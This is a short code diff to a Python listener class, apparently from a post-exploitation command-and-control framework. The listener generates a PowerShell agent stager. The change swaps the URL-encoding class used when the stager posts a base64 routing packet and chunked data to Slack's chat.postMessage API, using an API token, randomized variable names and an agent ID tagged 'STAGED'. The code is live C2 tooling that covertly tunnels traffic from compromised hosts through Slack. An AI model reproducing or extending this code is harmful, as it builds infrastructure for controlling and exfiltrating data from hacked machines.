@@ -515,7 +515,7 @@ class Listener:
 
                             try {
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
+                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Web.HTTPUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
 
                                 # grab the timestamp from the sent message so we can track a response
                                 $slack_response = ConvertFrom-Json20 $response
@@ -579,7 +579,7 @@ class Listener:
                                     $failures = 0
                                     while(!($success)) {
                                         try {
-                                            $part = $([System.Net.WebUtility]::UrlEncode($part))
+                                            $part = $([System.Web.HTTPUtility]::UrlEncode($part))
                                             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                             $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$($part)&username=$($AgentID):STAGED&thread_ts=$thread_ts")
                                             Start-Sleep 1
